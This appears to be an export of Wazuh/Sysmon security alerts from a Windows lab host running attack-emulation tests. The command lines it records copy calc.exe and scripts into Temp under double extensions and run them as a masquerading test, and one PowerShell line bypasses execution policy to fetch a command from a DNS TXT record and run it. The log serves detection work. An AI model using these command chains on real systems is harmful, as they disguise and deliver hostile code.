wazuh-alerts-4.x-2024.11.30,M_pYfJMBRlc-D5DFdCBH,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 09:13:00.901
ProcessGuid: {15959494-D71C-674A-7807-000000000D00}
ProcessId: 1920
Image: C:\Windows\system32\cmd.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\T1036.003_masquerading.doc.ps1
CreationUtcTime: 2024-11-25 23:42:07.180
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T09:13:00.901801900Z,57322,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,39,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:13:02.338",EventChannel,1732957982.3053253,"Nov 30, 2024 @ 09:13:02.338", , , , , , , , , , , , ,1920, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\system32\\cmd.exe, , , , , , ,{15959494-D71C-674A-7807-000000000D00},2024-11-30 09:13:00.901, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\T1036.003_masquerading.doc.ps1,2024-11-25 23:42:07.180, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,NPpYfJMBRlc-D5DFdCBH,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 09:13:00.902
ProcessGuid: {15959494-D71C-674A-7807-000000000D00}
ProcessId: 1920
Image: C:\Windows\system32\cmd.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\T1036.003_masquerading.pdf.ps1
CreationUtcTime: 2024-11-25 23:42:07.181
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T09:13:00.903187900Z,57324,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,40,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:13:02.374",EventChannel,1732957982.3056106,"Nov 30, 2024 @ 09:13:02.374", , , , , , , , , , , , ,1920, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\system32\\cmd.exe, , , , , , ,{15959494-D71C-674A-7807-000000000D00},2024-11-30 09:13:00.902, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\T1036.003_masquerading.pdf.ps1,2024-11-25 23:42:07.181, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,OPpYfJMBRlc-D5DFdCBH,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1036,technique_name=Masquerading
UtcTime: 2024-11-30 09:13:01.489
ProcessGuid: {15959494-D71D-674A-7B07-000000000D00}
ProcessId: 3016
Image: C:\Users\mari\AppData\Local\Temp\T1036.003_masquerading.ps1.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Calculator
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: CALC.EXE
CommandLine: C:\Users\mari\AppData\Local\Temp\T1036.003_masquerading.ps1.exe  
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=1A4E2C3BBC095CB7D9B85CABE2AEA2C9A769B480,MD5=AFAF2CDF9981342C494B28630608F74A,SHA256=284674A806BCBE692C76761BAAF21327638DE0C7135BFB06953648BE7D661FBD,IMPHASH=8EEAA9499666119D13B3F44ECD77A729
ParentProcessGuid: {15959494-D71C-674A-7807-000000000D00}
ParentProcessId: 1920
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.003_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.003_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.003_masquerading.ps1.exe /Y && copy ""4bd145_T1036.003_masquerading.vbs"" %temp%\T1036.003_masquerading.xls.vbs /Y && copy ""4bd145_T1036.003_masquerading.vbs"" %temp%\T1036.003_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.003_masquerading.vbs"" %temp%\T1036.003_masquerading.png.vbs /Y && copy ""107417_T1036.003_masquerading.ps1"" %temp%\T1036.003_masquerading.doc.ps1 /Y && copy ""107417_T1036.003_masquerading.ps1"" %temp%\T1036.003_masquerading.pdf.ps1 /Y && copy ""107417_T1036.003_masquerading.ps1"" %temp%\T1036.003_masquerading.rtf.ps1 /Y && %temp%\T1036.003_masquerading.docx.exe && %temp%\T1036.003_masquerading.pdf.exe && %temp%\T1036.003_masquerading.ps1.exe && %temp%\T1036.003_masquerading.xls.vbs && %temp%\T1036.003_masquerading.xlsx.vbs && %temp%\T1036.003_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.rtf.ps1
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:13:01.496344700Z,57335,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,2,false,4,Command shell started script with /c modifier,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92005, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:13:02.542",EventChannel,1732957982.3085560,"Nov 30, 2024 @ 09:13:02.542", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,3016, , , , , , , , , , ,"[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]", , , ,CALC.EXE,C:\\Users\\mari\\AppData\\Local\\Temp\\T1036.003_masquerading.ps1.exe,Microsoft® Windows® Operating System, , ,Windows Calculator, , ,{15959494-D71D-674A-7B07-000000000D00},2024-11-30 09:13:01.489,"SHA1=1A4E2C3BBC095CB7D9B85CABE2AEA2C9A769B480,MD5=AFAF2CDF9981342C494B28630608F74A,SHA256=284674A806BCBE692C76761BAAF21327638DE0C7135BFB06953648BE7D661FBD,IMPHASH=8EEAA9499666119D13B3F44ECD77A729","technique_id=T1036,technique_name=Masquerading",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D71C-674A-7807-000000000D00},"cmd.exe /C copy \""C:\\Windows\\System32\\calc.exe\"" %temp%\\T1036.003_masquerading.docx.exe /Y &amp;&amp; copy \""C:\\Windows\\System32\\calc.exe\"" %temp%\\T1036.003_masquerading.pdf.exe /Y &amp;&amp; copy \""C:\\Windows\\System32\\calc.exe\"" %temp%\\T1036.003_masquerading.ps1.exe /Y &amp;&amp; copy \""4bd145_T1036.003_masquerading.vbs\"" %temp%\\T1036.003_masquerading.xls.vbs /Y &amp;&amp; copy \""4bd145_T1036.003_masquerading.vbs\"" %temp%\\T1036.003_masquerading.xlsx.vbs /Y &amp;&amp; copy \""4bd145_T1036.003_masquerading.vbs\"" %temp%\\T1036.003_masquerading.png.vbs /Y &amp;&amp; copy \""107417_T1036.003_masquerading.ps1\"" %temp%\\T1036.003_masquerading.doc.ps1 /Y &amp;&amp; copy \""107417_T1036.003_masquerading.ps1\"" %temp%\\T1036.003_masquerading.pdf.ps1 /Y &amp;&amp; copy \""107417_T1036.003_masquerading.ps1\"" %temp%\\T1036.003_masquerading.rtf.ps1 /Y &amp;&amp; %temp%\\T1036.003_masquerading.docx.exe &amp;&amp; %temp%\\T1036.003_masquerading.pdf.exe &amp;&amp; %temp%\\T1036.003_masquerading.ps1.exe &amp;&amp; %temp%\\T1036.003_masquerading.xls.vbs &amp;&amp; %temp%\\T1036.003_masquerading.xlsx.vbs &amp;&amp; %temp%\\T1036.003_masquerading.png.vbs &amp;&amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.doc.ps1 &amp;&amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.pdf.ps1 &amp;&amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.rtf.ps1",0x107a6b,1920,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,C:\\Users\\mari\\AppData\\Local\\Temp\\T1036.003_masquerading.ps1.exe,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,O_pYfJMBRlc-D5DFdCBH,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1202,technique_name=Indirect Command Execution
UtcTime: 2024-11-30 09:13:02.308
ProcessGuid: {15959494-D71E-674A-7E07-000000000D00}
ProcessId: 3904
Image: C:\Windows\System32\wscript.exe
FileVersion: 5.812.10240.16384
Description: Microsoft ® Windows Based Script Host
Product: Microsoft ® Windows Script Host
Company: Microsoft Corporation
OriginalFileName: wscript.exe
CommandLine: ""C:\Windows\System32\WScript.exe"" ""C:\Users\mari\AppData\Local\Temp\T1036.003_masquerading.png.vbs""  
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=2661E5F3562DD03C0ED21C33E2888E2FD1137D8C,MD5=9A68ADD12EB50DDE7586782C3EB9FF9C,SHA256=62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED,IMPHASH=93B1E62305A8CEC30A5FBE39C04A90BD
ParentProcessGuid: {15959494-D71C-674A-7807-000000000D00}
ParentProcessId: 1920
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.003_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.003_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.003_masquerading.ps1.exe /Y && copy ""4bd145_T1036.003_masquerading.vbs"" %temp%\T1036.003_masquerading.xls.vbs /Y && copy ""4bd145_T1036.003_masquerading.vbs"" %temp%\T1036.003_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.003_masquerading.vbs"" %temp%\T1036.003_masquerading.png.vbs /Y && copy ""107417_T1036.003_masquerading.ps1"" %temp%\T1036.003_masquerading.doc.ps1 /Y && copy ""107417_T1036.003_masquerading.ps1"" %temp%\T1036.003_masquerading.pdf.ps1 /Y && copy ""107417_T1036.003_masquerading.ps1"" %temp%\T1036.003_masquerading.rtf.ps1 /Y && %temp%\T1036.003_masquerading.docx.exe && %temp%\T1036.003_masquerading.pdf.exe && %temp%\T1036.003_masquerading.ps1.exe && %temp%\T1036.003_masquerading.xls.vbs && %temp%\T1036.003_masquerading.xlsx.vbs && %temp%\T1036.003_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.rtf.ps1
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:13:02.309757800Z,57353,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,5,false,4,Command shell started script with /c modifier,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92005, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:13:03.401",EventChannel,1732957983.3121387,"Nov 30, 2024 @ 09:13:03.401", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,3904, , , , , , , , , , ,"[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]", , , ,wscript.exe,C:\\Windows\\System32\\wscript.exe,Microsoft ® Windows Script Host, , ,Microsoft ® Windows Based Script Host, , ,{15959494-D71E-674A-7E07-000000000D00},2024-11-30 09:13:02.308,"SHA1=2661E5F3562DD03C0ED21C33E2888E2FD1137D8C,MD5=9A68ADD12EB50DDE7586782C3EB9FF9C,SHA256=62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED,IMPHASH=93B1E62305A8CEC30A5FBE39C04A90BD","technique_id=T1202,technique_name=Indirect Command Execution",Microsoft Corporation,5.812.10240.16384,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D71C-674A-7807-000000000D00},"cmd.exe /C copy \""C:\\Windows\\System32\\calc.exe\"" %temp%\\T1036.003_masquerading.docx.exe /Y &amp;&amp; copy \""C:\\Windows\\System32\\calc.exe\"" %temp%\\T1036.003_masquerading.pdf.exe /Y &amp;&amp; copy \""C:\\Windows\\System32\\calc.exe\"" %temp%\\T1036.003_masquerading.ps1.exe /Y &amp;&amp; copy \""4bd145_T1036.003_masquerading.vbs\"" %temp%\\T1036.003_masquerading.xls.vbs /Y &amp;&amp; copy \""4bd145_T1036.003_masquerading.vbs\"" %temp%\\T1036.003_masquerading.xlsx.vbs /Y &amp;&amp; copy \""4bd145_T1036.003_masquerading.vbs\"" %temp%\\T1036.003_masquerading.png.vbs /Y &amp;&amp; copy \""107417_T1036.003_masquerading.ps1\"" %temp%\\T1036.003_masquerading.doc.ps1 /Y &amp;&amp; copy \""107417_T1036.003_masquerading.ps1\"" %temp%\\T1036.003_masquerading.pdf.ps1 /Y &amp;&amp; copy \""107417_T1036.003_masquerading.ps1\"" %temp%\\T1036.003_masquerading.rtf.ps1 /Y &amp;&amp; %temp%\\T1036.003_masquerading.docx.exe &amp;&amp; %temp%\\T1036.003_masquerading.pdf.exe &amp;&amp; %temp%\\T1036.003_masquerading.ps1.exe &amp;&amp; %temp%\\T1036.003_masquerading.xls.vbs &amp;&amp; %temp%\\T1036.003_masquerading.xlsx.vbs &amp;&amp; %temp%\\T1036.003_masquerading.png.vbs &amp;&amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.doc.ps1 &amp;&amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.pdf.ps1 &amp;&amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.rtf.ps1",0x107a6b,1920,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,"\""C:\\Windows\\System32\\WScript.exe\"" \""C:\\Users\\mari\\AppData\\Local\\Temp\\T1036.003_masquerading.png.vbs\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,PPpYfJMBRlc-D5DFdCBH,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 09:13:02.346
ProcessGuid: {15959494-D71E-674A-7F07-000000000D00}
ProcessId: 7104
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  -File C:\Users\mari\AppData\Local\Temp\T1036.003_masquerading.doc.ps1 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: {15959494-D71C-674A-7807-000000000D00}
ParentProcessId: 1920
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.003_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.003_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.003_masquerading.ps1.exe /Y && copy ""4bd145_T1036.003_masquerading.vbs"" %temp%\T1036.003_masquerading.xls.vbs /Y && copy ""4bd145_T1036.003_masquerading.vbs"" %temp%\T1036.003_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.003_masquerading.vbs"" %temp%\T1036.003_masquerading.png.vbs /Y && copy ""107417_T1036.003_masquerading.ps1"" %temp%\T1036.003_masquerading.doc.ps1 /Y && copy ""107417_T1036.003_masquerading.ps1"" %temp%\T1036.003_masquerading.pdf.ps1 /Y && copy ""107417_T1036.003_masquerading.ps1"" %temp%\T1036.003_masquerading.rtf.ps1 /Y && %temp%\T1036.003_masquerading.docx.exe && %temp%\T1036.003_masquerading.pdf.exe && %temp%\T1036.003_masquerading.ps1.exe && %temp%\T1036.003_masquerading.xls.vbs && %temp%\T1036.003_masquerading.xlsx.vbs && %temp%\T1036.003_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.rtf.ps1
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:13:02.347696900Z,57359,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,6,Powershell executed script from suspicious location,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92029, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:13:03.511",EventChannel,1732957983.3133352,"Nov 30, 2024 @ 09:13:03.511", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,7104, , , , , , , , , , ,"[""PowerShell""]","[""T1059.001""]","[""Execution""]", , , ,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System, , ,Windows PowerShell, , ,{15959494-D71E-674A-7F07-000000000D00},2024-11-30 09:13:02.346,"SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F","technique_id=T1059.001,technique_name=PowerShell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D71C-674A-7807-000000000D00},"cmd.exe /C copy \""C:\\Windows\\System32\\calc.exe\"" %temp%\\T1036.003_masquerading.docx.exe /Y &amp;&amp; copy \""C:\\Windows\\System32\\calc.exe\"" %temp%\\T1036.003_masquerading.pdf.exe /Y &amp;&amp; copy \""C:\\Windows\\System32\\calc.exe\"" %temp%\\T1036.003_masquerading.ps1.exe /Y &amp;&amp; copy \""4bd145_T1036.003_masquerading.vbs\"" %temp%\\T1036.003_masquerading.xls.vbs /Y &amp;&amp; copy \""4bd145_T1036.003_masquerading.vbs\"" %temp%\\T1036.003_masquerading.xlsx.vbs /Y &amp;&amp; copy \""4bd145_T1036.003_masquerading.vbs\"" %temp%\\T1036.003_masquerading.png.vbs /Y &amp;&amp; copy \""107417_T1036.003_masquerading.ps1\"" %temp%\\T1036.003_masquerading.doc.ps1 /Y &amp;&amp; copy \""107417_T1036.003_masquerading.ps1\"" %temp%\\T1036.003_masquerading.pdf.ps1 /Y &amp;&amp; copy \""107417_T1036.003_masquerading.ps1\"" %temp%\\T1036.003_masquerading.rtf.ps1 /Y &amp;&amp; %temp%\\T1036.003_masquerading.docx.exe &amp;&amp; %temp%\\T1036.003_masquerading.pdf.exe &amp;&amp; %temp%\\T1036.003_masquerading.ps1.exe &amp;&amp; %temp%\\T1036.003_masquerading.xls.vbs &amp;&amp; %temp%\\T1036.003_masquerading.xlsx.vbs &amp;&amp; %temp%\\T1036.003_masquerading.png.vbs &amp;&amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.doc.ps1 &amp;&amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.pdf.ps1 &amp;&amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.rtf.ps1",0x107a6b,1920,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe  -File C:\\Users\\mari\\AppData\\Local\\Temp\\T1036.003_masquerading.doc.ps1,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,EfpPfJMBRlc-D5DFOCDc,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 09:02:58.011
ProcessGuid: {15959494-D4C1-674A-6107-000000000D00}
ProcessId: 6808
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_pl0vlfc5.3li.ps1
CreationUtcTime: 2024-11-30 09:02:58.011
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T09:02:58.017141100Z,57151,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,26,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:02:59.114",EventChannel,1732957379.2908170,"Nov 30, 2024 @ 09:02:59.114", , , , , , , , , , , , ,6808, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-D4C1-674A-6107-000000000D00},2024-11-30 09:02:58.011, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_pl0vlfc5.3li.ps1,2024-11-30 09:02:58.011, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,EvpPfJMBRlc-D5DFOCDc,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 09:02:58.338
ProcessGuid: {15959494-D4C2-674A-6307-000000000D00}
ProcessId: 1984
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" . whoami
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: {15959494-D4C1-674A-6107-000000000D00}
ParentProcessId: 6808
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""function nslookup  { &\""$env:windir\system32\nslookup.exe\"" @args | Out-Null; @(\""\"",\""whoami\"")}; powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:02:58.339792600Z,57157,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,4,Powershell process spawned powershell instance,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92027, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:02:59.208",EventChannel,1732957379.2911181,"Nov 30, 2024 @ 09:02:59.208", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,1984, , , , , , , , , , ,"[""PowerShell""]","[""T1059.001""]","[""Execution""]", , , ,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System, , ,Windows PowerShell, , ,{15959494-D4C2-674A-6307-000000000D00},2024-11-30 09:02:58.338,"SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F","technique_id=T1059.001,technique_name=PowerShell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D4C1-674A-6107-000000000D00},"powershell.exe -ExecutionPolicy Bypass -C \""function nslookup  { &amp;\\\""$env:windir\\system32\\nslookup.exe\\\"" @args | Out-Null; @(\\\""\\\"",\\\""whoami\\\"")}; powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]\""",0x107a6b,6808,C:\\Windows\\system32\\,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" . whoami",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,E_pPfJMBRlc-D5DFOCDc,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 09:02:58.409
ProcessGuid: {15959494-D4C2-674A-6307-000000000D00}
ProcessId: 1984
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_grlsuhj0.tpi.ps1
CreationUtcTime: 2024-11-30 09:02:58.409
